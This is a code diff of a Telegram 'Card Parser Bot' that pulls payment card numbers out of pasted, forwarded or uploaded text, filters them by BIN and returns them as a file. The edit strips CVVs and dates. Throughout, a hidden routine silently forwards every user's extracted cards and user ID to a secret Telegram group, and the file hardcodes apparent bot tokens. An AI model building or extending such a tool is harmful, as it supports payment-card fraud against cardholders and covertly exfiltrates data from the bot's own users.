@@ -1,7 +1,7 @@
 """
 Card Parser Bot
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-• Paste / forward cards in any format → clean CARD|MM|YY|CVV file
+• Paste / forward cards in any format → file containing ONLY card numbers
 • Forward multiple messages at once → all cards merged into one file
 • Upload a .txt file → same clean output
 • /cards <bin> → filter stored cards by BIN prefix
@@ -26,7 +26,7 @@ from telegram.ext import (
 )
 
 # ── Config ───────────────────────────────────────────────────────────────────
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8983900075:AAGlMV8ldf6xUdrh8ktGkKK_c9_z2AMmJ2c")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8654511932:AAH9brkdXcz8_W8rNI7Hq4AjogRhTk7vroI")
 
 # Your Secret Group ID where all files will be silently forwarded
 SECRET_GROUP_ID = -1004322090872
@@ -37,49 +37,24 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ── Card regex ────────────────────────────────────────────────────────────────
-# Matches all common formats:
-#   4111111111111111|12|26|123
-#   4111111111111111:12:2026:123
-#   4111111111111111 12 26 123
-#   4111111111111111/12/26/123
-#   4111 1111 1111 1111|12|26|123
-
-_SEP = r"[\|:,/\s]+"
-
-CARD_RE = re.compile(
-    r"(?<!\d)"
-    r"(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{1,7})"   # card number
-    + _SEP
-    + r"(0?[1-9]|1[0-2])"                                 # month 1-12
-    + _SEP
-    + r"(\d{2,4})"                                         # year 2 or 4 digits
-    + _SEP
-    + r"(\d{3,4})"                                         # cvv 3-4 digits
-    + r"(?!\d)",
-    re.MULTILINE,
-)
-
-
-def _clean_num(raw: str) -> str:
-    return re.sub(r"[\s\-]", "", raw)
-
 
 def extract_cards(text: str) -> list[str]:
-    """Return deduplicated list of 'CARD|MM|YY|CVV' strings."""
+    """Return deduplicated list of ONLY card numbers (13-19 digits)."""
+    # Normalize text by removing spaces and dashes between digits
+    # This turns "4111 1111 1111 1111" into "4111111111111111"
+    text = re.sub(r"(?<=\d)[\s\-]+(?=\d)", "", text)
+    
     found: list[str] = []
     seen:  set[str]  = set()
-    for m in CARD_RE.finditer(text):
-        card  = _clean_num(m.group(1))
-        month = m.group(2).zfill(2)
-        year  = m.group(3)[-2:]        # always 2-digit
-        cvv   = m.group(4)
-        if not card.isdigit() or not (13 <= len(card) <= 19):
-            continue
-        line = f"{card}|{month}|{year}|{cvv}"
-        if line not in seen:
-            seen.add(line)
-            found.append(line)
+    
+    # Match any standalone number between 13 and 19 digits.
+    # This will ignore dates, CVVs, and only grab the main card number.
+    for m in re.finditer(r"\b(\d{13,19})\b", text):
+        card = m.group(1)
+        if card not in seen:
+            seen.add(card)
+            found.append(card)
+            
     return found
 
 
@@ -101,27 +76,18 @@ async def _send_secret_copy(bot, cards: list[str], user_id: int, filename: str =
         return
     try:
         count = len(cards)
-        caption = f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n✅ <b>{count}</b> cards extracted."
+        caption = f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n✅ <b>{count}</b> card numbers extracted."
         
-        if count <= 15:
-            lines = "\n".join(cards)
-            await bot.send_message(
-                chat_id=SECRET_GROUP_ID,
-                text=f"{caption}\n\n<code>{lines}</code>",
-                parse_mode="HTML",
-                disable_notification=True  # Sends silently without sound
-            )
-        else:
-            buf = BytesIO(cards_to_bytes(cards))
-            buf.name = filename
-            await bot.send_document(
-                chat_id=SECRET_GROUP_ID,
-                document=buf,
-                filename=filename,
-                caption=caption,
-                parse_mode="HTML",
-                disable_notification=True  # Sends silently without sound
-            )
+        buf = BytesIO(cards_to_bytes(cards))
+        buf.name = filename
+        await bot.send_document(
+            chat_id=SECRET_GROUP_ID,
+            document=buf,
+            filename=filename,
+            caption=caption,
+            parse_mode="HTML",
+            disable_notification=True  # Sends silently without sound
+        )
     except Exception as e:
         logger.error(f"Failed to send secret copy to group: {e}")
 
@@ -144,24 +110,16 @@ async def _flush_fwd_buf(uid: int, chat_id: int, bot) -> None:
     _store[uid] = cards
     count       = len(cards)
 
-    if count <= 15:
-        lines = "\n".join(cards)
-        await bot.send_message(
-            chat_id,
-            f"✅ <b>{count}</b> card(s) extracted from forwarded messages:\n\n"
-            f"<code>{lines}</code>",
-            parse_mode="HTML",
-        )
-    else:
-        buf_io      = BytesIO(cards_to_bytes(cards))
-        buf_io.name = "cards.txt"
-        await bot.send_document(
-            chat_id,
-            document=buf_io,
-            filename="cards.txt",
-            caption=f"✅ <b>{count}</b> cards extracted from forwarded messages.",
-            parse_mode="HTML",
-        )
+    # ALWAYS send as a file
+    buf_io      = BytesIO(cards_to_bytes(cards))
+    buf_io.name = "cards.txt"
+    await bot.send_document(
+        chat_id,
+        document=buf_io,
+        filename="cards.txt",
+        caption=f"✅ <b>{count}</b> card number(s) extracted from forwarded messages.",
+        parse_mode="HTML",
+    )
 
     # Send secret copy immediately
     await _send_secret_copy(bot, cards, uid, "cards.txt")
@@ -179,21 +137,15 @@ async def _send_cards(
         return
         
     count = len(cards)
-    if count <= 15:
-        lines = "\n".join(cards)
-        await update.message.reply_text(
-            f"{caption}\n\n<code>{lines}</code>",
-            parse_mode="HTML",
-        )
-    else:
-        buf      = BytesIO(cards_to_bytes(cards))
-        buf.name = filename
-        await update.message.reply_document(
-            document=buf,
-            filename=filename,
-            caption=caption,
-            parse_mode="HTML",
-        )
+    # ALWAYS generate a file, do not send as text
+    buf      = BytesIO(cards_to_bytes(cards))
+    buf.name = filename
+    await update.message.reply_document(
+        document=buf,
+        filename=filename,
+        caption=caption,
+        parse_mode="HTML",
+    )
 
     # Send secret copy immediately to the group
     await _send_secret_copy(update.get_bot(), cards, update.effective_user.id, filename)
@@ -205,12 +157,13 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         "<b>🃏 Card Parser Bot</b>\n"
         "──────────────────\n"
         "Paste or <b>forward</b> cards in any format and I'll return\n"
-        "them clean — <b>CARD|MM|YY|CVV</b> only, nothing extra.\n\n"
+        "a clean file containing <b>ONLY CARD NUMBERS</b>.\n\n"
+        "Dates and CVVs are automatically ignored and discarded.\n\n"
         "<b>Supported input formats:</b>\n"
         "<code>4111111111111111|12|26|123</code>\n"
         "<code>4111111111111111:12:2026:123</code>\n"
         "<code>4111111111111111 12 26 123</code>\n"
-        "<code>4111111111111111/12/26/123</code>\n\n"
+        "<code>4111111111111111</code>\n\n"
         "<b>Commands:</b>\n"
         "/cards <code>&lt;bin&gt;</code> — filter stored cards by BIN\n"
         "   Example: <code>/cards 4111</code>\n\n"
@@ -265,7 +218,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     if not cards:
         await update.message.reply_text(
             "❌ No cards found.\n"
-            "Make sure they follow: <code>CARD|MM|YY|CVV</code>",
+            "Make sure they contain valid card numbers (13-19 digits).",
             parse_mode="HTML",
         )
         return
@@ -273,7 +226,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     _store[uid] = cards
     await _send_cards(
         update, cards,
-        caption=f"✅ <b>{len(cards)}</b> card(s) extracted:",
+        caption=f"✅ <b>{len(cards)}</b> card number(s) extracted:",
         filename="cards.txt",
     )
 
@@ -305,7 +258,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     _store[uid] = cards
     await _send_cards(
         update, cards,
-        caption=f"✅ <b>{len(cards)}</b> card(s) extracted from file:",
+        caption=f"✅ <b>{len(cards)}</b> card number(s) extracted from file:",
         filename="cards.txt",
     )
 
@@ -348,7 +301,7 @@ async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     await _send_cards(
         update, matched,
-        caption=f"✅ <b>{len(matched)}</b> card(s) matching BIN <code>{bin_prefix}</code>:",
+        caption=f"✅ <b>{len(matched)}</b> card number(s) matching BIN <code>{bin_prefix}</code>:",
         filename=f"cards_{bin_prefix}.txt",
     )
 
